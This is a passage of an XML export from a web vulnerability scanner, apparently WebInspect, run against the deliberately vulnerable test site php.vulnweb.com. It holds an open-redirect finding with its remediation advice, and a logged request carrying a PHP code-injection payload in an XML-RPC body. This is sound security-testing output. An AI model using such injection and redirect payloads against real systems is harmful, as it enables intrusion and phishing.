<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:57:39 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4803</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="5E0A26249C2FD40E0E15257F12177572"><URL>http://php.vulnweb.com:80/redir.php?r=http://www.webinspect.hp.com/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>r</AttackParamDescriptor><Issues><Issue id="8c43941e-e3df-4a3e-9f40-2f9ff5503b20"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>CUSTOM</EngineType><AttackHTTPRequest><![CDATA[GET /redir.php?r=http://www.webinspect.hp.com/ HTTP/1.1
Referer: http://php.vulnweb.com/index.bak
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="5E0A26249C2FD40E0E15257F12177572";PSID="ED218ED39AD99F6EAB19B7198D05DD5F";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="e974f0fd-2e0a-4f6d-8ddc-95c224ed2191";AttackSequence="0";AttackParamDesc="r";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10705";Engine="Parameter+Based+Redirection";SmartMode="4";AttackString="http%3a%2f%2fwww.webinspect.hp.com%2f";AttackStringProps="Attack";tid="34";tt="11";
X-RequestManager-Memo: sid="39";smi="0";sc="1";ID="5c414223";
X-Request-Memo: ID="fd884bd3";sc="1";tid="45";
Cookie: CustomCookie=WebInspect0;login=test%2Ftest

]]></AttackHTTPRequest><VulnerabilityID>10705</VulnerabilityID><Severity>3</Severity><Name>Parameter Based Redirection</Name><Classifications><Classification kind="CWE" identifier="CWE-601" href="http://cwe.mitre.org/data/definitions/601.html">CWE-601: URL Redirection to Untrusted Site ('Open Redirect')</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Open Redirect" href="https://vulncat.fortify.com/">Open Redirect</Classification></Classifications><DetectionSelection><Location offset="151" length="41" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[A vulnerability has been detected within your web application due to the manner in which certain requests are redirected.  If exploited, this could lead to an attacker utilizing an external site that appears as if it was part of the original domain, a key component of Phishing attacks.  Recommendations include adopting secure programming techniques which do not rely on utilizing the HTML meta refresh tag or HTTP redirection capabilities as a method of redirecting users to other sites specified by the user.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />An attacker can manipulate a parameter value to redirect users to arbitrary sites, aiding in Phishing attacks.<br />]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />Submit a URL in the parameter value to the vulnerable website. If successful, the client will be redirected to a page of the attacker's choice.<br /><br /><b>Example:</b><br />A script usually has three components:
<ol><li>The name of the script (redirect.cgi).
</li><li>The parameter of the script (redirect.cgi?url=).
</li><li>The value of the parameter (redirect.cgi?url=http://www.example.com/).
</li></ol><br />
By passing a value of http://www.example.com to the parameter an attacker can redirect an unsuspecting user to a site of their choice.<br />]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Developers:</b><br /><br />

There are several secure programming techniques that can be utilized to mitigate the risk from a Phishing attack. <br /><br /><ul><li>Always sanitize data returned from a user or other application components before storing or processing it, or presenting it back to the application user.</li><li>Maintain a list of valid "redirection" URL's.</li><li>Ensure that all characters that could be interpreted as an executable language are replaced with their corresponding HTML encoded versions. </li><li>Do not accept session information from within a URL.</li><li>Do not reference redirection URL's or alternative file paths within the browser's URL path. </li><br /><li>Do not use the HTML Meta refresh tag to redirect users</li><br /><li>Do not utilize the Referrer header (or an equivalent) as a method of authorization or authentication.</li></ul><b>For Security Operations:</b><br /><br />
This specific issue will need to be addressed in the code of the web application. There are several items outside of the strict realm of web application security that can be pursued to prevent successful Phishing attacks, such as utilizing a managed service which analyzes email for common threads found in similar attacks and which also scours the Internet for improper use of proprietary logos and trademarks. Also, gateway content filtering can be employed to inspect communications for malicious content or requests.

<br /><br /><b>For QA:</b><br /><br />
Testing for susceptibility to Phishing attacks usually falls outside of the standard protocol of QA testing.  However, there are some measures QA professionals can take to lessen the risk.  It is a good testing practice to ensure that the architectural naming conventions of your application employs the same root domain, and that in the interests of organization and simplicity host names reflect the nature of the application.  It is also wise to ensure that the application does not allow users to supply their own URL's in any form or fashion.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>OWASP Data Validation Article:</b><br /><a href="http://www.owasp.org/index.php/Data_Validation">http://www.owasp.org/index.php/Data_Validation</a><br />]]></SectionText></ReportSection></Issue></Issues><RawRequest id="5E0A26249C2FD40E0E15257F12177572"><![CDATA[GET /redir.php?r=http://www.webinspect.hp.com/ HTTP/1.1
Referer: http://php.vulnweb.com/index.bak
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="5E0A26249C2FD40E0E15257F12177572";PSID="ED218ED39AD99F6EAB19B7198D05DD5F";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="e974f0fd-2e0a-4f6d-8ddc-95c224ed2191";AttackSequence="0";AttackParamDesc="r";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10705";Engine="Parameter+Based+Redirection";SmartMode="4";AttackString="http%3a%2f%2fwww.webinspect.hp.com%2f";AttackStringProps="Attack";tid="34";tt="11";
X-RequestManager-Memo: sid="39";smi="0";sc="1";ID="5c414223";
X-Request-Memo: ID="fd884bd3";sc="1";tid="45";
Cookie: CustomCookie=WebInspect0;login=test%2Ftest

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 302 Moved Temporarily
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:57:39 GMT
Server: nginx/1.19.0
Location: http://www.webinspect.hp.com/
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 5

0

]]></RawResponse><Request id="5E0A26249C2FD40E0E15257F12177572"><Method>GET</Method><Path>/</Path><File>redir</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>r=http://www.webinspect.hp.com/</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0;login=test%2Ftest
</Cookie><Queries><Query><Name>r</Name><Value>http://www.webinspect.hp.com/</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/index.bak</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="5E0A26249C2FD40E0E15257F12177572";PSID="ED218ED39AD99F6EAB19B7198D05DD5F";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="e974f0fd-2e0a-4f6d-8ddc-95c224ed2191";AttackSequence="0";AttackParamDesc="r";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10705";Engine="Parameter+Based+Redirection";SmartMode="4";AttackString="http%3a%2f%2fwww.webinspect.hp.com%2f";AttackStringProps="Attack";tid="34";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="39";smi="0";sc="1";ID="5c414223";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="fd884bd3";sc="1";tid="45";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie><Cookie><Name>login</Name><Value>test%2Ftest</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>302</StatusCode><StatusDescription>Moved Temporarily</StatusDescription><SetCookie /><ResponseBody><![CDATA[0

]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:57:39 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Location</Name><Value>http://www.webinspect.hp.com/</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>5</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="27151D12D0EDC229C28E696E687FDC0C"><URL>http://php.vulnweb.com:80/redir.php?r=index.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="27151D12D0EDC229C28E696E687FDC0C"><![CDATA[POST /redir.php?r=index.php HTTP/1.1
Referer: http://php.vulnweb.com/index.bak
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Content-Length: 168
Connection: Keep-Alive
Cookie: CustomCookie=WebInspect0

<?xml version="1.0"?><methodCall><methodName>test.method</methodName><params><param><value><name>','')); phpinfo(); exit;/*</name></value></param></params></methodCall>]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 302 Moved Temporarily
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:57:40 GMT
Server: nginx/1.19.0
Location: index.php
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 5

0

]]></RawResponse><Request id="27151D12D0EDC229C28E696E687FDC0C"><Method>POST</Method><Path>/</Path><File>redir</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>r=index.php</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[<?xml version="1.0"?><methodCall><methodName>test.method</methodName><params><param><value><name>','')); phpinfo(); exit;/*</name></value></param></params></methodCall>]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>r</Name><Value>index.php</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/index.bak</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Content-Length</Name><Value>168</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>302</StatusCode><StatusDescription>Moved Temporarily</StatusDescription><SetCookie /><ResponseBody><![CDATA[0

]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:57:40 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Location</Name><Value>index.php</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>5</Value></Header></Headers><SetCookies /><Forms /></Response></Session></Sessions>